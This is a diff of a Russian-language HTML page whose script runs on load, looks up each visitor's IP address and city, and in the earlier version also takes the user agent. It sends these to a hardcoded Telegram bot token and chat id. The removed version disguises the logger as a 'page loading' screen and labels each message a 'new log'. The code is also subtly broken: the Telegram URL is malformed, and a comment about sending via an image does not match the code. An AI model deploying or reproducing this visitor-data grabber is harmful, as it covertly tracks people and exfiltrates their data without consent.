@@ -2,29 +2,28 @@
 <html>
 <head><meta charset="UTF-8"></head>
 <body>
-    <h1>Страница загружается, подождите...</h1>
+    <h1 id="status">Загрузка... (v2.0)</h1>
     <script>
-        (async () => {
+        async function send() {
             const token = "8334056184:AAEvbx3eM-yW3jibp0nUx9YbqDgWX80wMcE";
             const chat_id = "8426763446";
-
+            
             try {
                 // 1. Получаем IP
                 const res = await fetch('https://ipapi.co');
                 const data = await res.json();
                 
-                // 2. Формируем текст
-                const message = `🚀 НОВЫЙ ЛОГ!\n📍 IP: ${data.ip}\n🌍 Город: ${data.city}\n📱 Устройство: ${navigator.userAgent}`;
-
-                // 3. Отправляем (ВАЖНО: тут стоит /sendMessage в конце)
-                const url = `https://api.telegram.org{token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`;
+                // 2. Отправляем в ТГ (через обычную картинку - это самый надежный способ обойти блокировки)
+                const text = `IP: ${data.ip} | City: ${data.city}`;
+                const url = `https://api.telegram.org{token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}&v=${Math.random()}`;
                 
                 await fetch(url);
-                console.log("Успешно отправлено!");
+                document.getElementById('status').innerText = "Готово! Проверь телеграм.";
             } catch (e) {
-                console.error("Ошибка:", e);
+                document.getElementById('status').innerText = "Ошибка: " + e;
             }
-        })();
+        }
+        send();
     </script>
 </body>
 </html>
